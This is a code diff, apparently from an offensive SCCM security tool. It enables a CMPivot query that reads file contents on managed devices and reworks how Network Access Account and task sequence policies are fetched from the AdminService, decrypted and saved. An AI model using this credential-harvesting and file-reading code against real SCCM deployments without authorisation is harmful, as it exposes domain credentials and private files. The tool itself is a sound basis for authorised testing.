@@ -137,18 +137,21 @@ class CMPIVOT(AdminServiceClient):
         path = "File('" + arg + "') | distinct FileName, Mode, LastWriteTime, Size, Device" 
         query["InputQuery"] = path
         self.device = device
+        print(query)
         self.do_request(query)
         return
 
     
     # this function doesn't work no matter how hard I try
     # used a script instead open a PR please!!
-    # def file_content(self, arg):
-    #     query = {"InputQuery": ""}
-    #     path = "FileContent('" + arg + "')"
-    #     query["InputQuery"] = path
-    #     self.do_request(query)
-    #     return
+    def file_content(self, arg, device):
+        self.device = device
+        query = {"InputQuery": ""}
+        path = f"FileContent('{arg}')"
+        query["InputQuery"] = path
+        print(query)
+        self.do_request(query)
+        return
     
     def file_share(self, device):
         self.device = device
@@ -239,6 +242,7 @@ class CMPIVOT(AdminServiceClient):
         endpoint = f"https://{self.target}/AdminService/v1.0/{self.endpoint}({self.device})/AdminService.RunCMPivot"
         try:
             r = self.http_post(endpoint, json_data=body)
+            print(body)
             if r.status_code == 200:
                 js0n = r.json()
                 if self.endpoint == "Collections":
@@ -1110,7 +1114,6 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
         
     #thx @blurbdust https://github.com/blurbdust/PXEThief/blob/6d21293465959796c629e0a3517f1bb1655289b0/media_variable_file_cryptography.py#L80
     def credential_string_algo(self,credential_string):
-        hash_type = ""
         algo_bytes = credential_string[112:116]
         if algo_bytes == "1066":
             hash_type = "aes256"
@@ -1151,10 +1154,13 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
         return b0_sha1 + b1_sha1 
 
     def pretty_print_xml(self, xml_string):
-        root = ET.fromstring(xml_string)
-        ET.indent(root, space='  ')
-        formatted = (ET.tostring(root, encoding='unicode'))
-        return formatted
+        try:
+            root = ET.fromstring(xml_string)
+            ET.indent(root, space='  ')
+            formatted = (ET.tostring(root, encoding='unicode'))
+            return formatted
+        except Exception as e:
+            logger.info("[-] Could not format XML body. Policy body may be corrupted.")
 
     def deobfuscate_credential_string(self, credential_string):
         
@@ -1172,6 +1178,7 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
         elif algo == "aes256":
             last_16 = math.floor(len(encrypted_data)/16)*16 
             return self.aes256_decrypt(encrypted_data[:last_16], key[:32])
+
         
     def parse_xml(self, xml):
         #parses NAA and TS policies. NAAs are printed since they're static TS are saved becuase they're thicc
@@ -1211,29 +1218,31 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
                     if value_elem is not None and value_elem.text:
                         ts_data = value_elem.text.strip()
                         ts_sequence = self.deobfuscate_credential_string(ts_data)
-                        ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()
+                        if ts_sequence:
+                            ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()
 
-                            # Only save if we haven't seen this hash before
-                        if ts_hash not in seen_ts_hashes:
-                            logger.info("[+] Found Task Sequence policy")
-                            # idk what the deal is but there's weird chars at the end so accept the jank
-                            try:
-                                stripped_task_sequence = ts_sequence.split('</sequence>')[0] + '</sequence>'
-                                if stripped_task_sequence:
-                                    pretty_xml = self.pretty_print_xml(stripped_task_sequence)
-                                    logger.info("[*] XML pretty printed successfully")
-                                else:
-                                    pretty_xml = ts_sequence
-                                    logger.info("[*] Could not pretty print policy, saving unformatted XML")
-                                logger.info("[!] successfully deobfuscated task sequence")
-                                with open (f"ts_sequence_{ts_hash}.xml", 'w', encoding='utf-8') as f:
-                                    f.write(pretty_xml)
-                                    logger.info(f"[+] task sequence policy saved to ts_sequence_{ts_hash}.xml")
-                            except Exception as e:
-                                print(e)
-                                continue
-                            seen_ts_hashes.add(ts_hash)
-                            
+                                # Only save if we haven't seen this hash before
+                            if ts_hash not in seen_ts_hashes:
+                                logger.info("[+] Found Task Sequence policy")
+                                # idk what the deal is but there's weird chars at the end so accept the jank
+                                try:
+                                    if not ts_sequence.endswith('</sequence>'):
+                                        stripped_task_sequence = ts_sequence.split('</sequence>')[0] + '</sequence>'
+                                    else: stripped_task_sequence = ts_sequence
+                                    
+                                    if stripped_task_sequence:
+                                        pretty_xml = self.pretty_print_xml(stripped_task_sequence)
+                                    else:
+                                        pretty_xml = ts_sequence
+                                        logger.info("[*] Could not pretty print policy, saving unformatted XML")
+                                    if pretty_xml:
+                                        with open (f"ts_sequence_{ts_hash}.xml", 'w', encoding='utf-8') as f:
+                                            f.write(pretty_xml)
+                                            logger.info(f"[+] task sequence policy saved to ts_sequence_{ts_hash}.xml")
+                                except Exception as e:
+                                    raise
+                                seen_ts_hashes.add(ts_hash)
+                                
         except Exception as e:
             print(e)
             
@@ -1241,16 +1250,18 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
 
     def get_naa_policies(self):
         try:
+            logger.info("[*] Checking for NAA policies...")
             url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetClientConfigPolicies"
-            response = self.http_request(url)
-            json_response = response.json() 
-            xml_content = (json_response['PolicyXmls'][0])
-            self.parse_xml(xml_content)
+            response = self.http_get(url)
+            json_response = response.json()
+            xml_bodies = json_response['PolicyXmls']
+            for body in xml_bodies:
+                self.parse_xml(body)
         except Exception as e:
             print(e)
             pass
 
-
+                    
     def get_ts_policy(self, ts_package_ids):
         # request the policy and call the parser to save the task sequence 
         url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetTSPolicies"
@@ -1262,7 +1273,7 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
                         "AdvertisementComment": "blah",
                         "SourceSite" : "blah"
                         }
-                response = self.http_request(url, body=body)
+                response = self.http_post(url, json_data=body)
                 if response:
                     response_json = response.json()
                     policy_xmls = response_json['PolicyXmls'][0]
@@ -1270,9 +1281,11 @@ class SPEAKTOTHEMANAGER(AdminServiceClient):
                 
             except Exception as e:
                     logger.info(e)        
+         
     
     def get_ts_packages(self):
         # grab all the TS packages and build a list out of the IDs
+        logger.info("[*] Checking for Task Sequence policies...")
         url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage?$select=PackageID"
         response = self.http_request(url)
         if response:
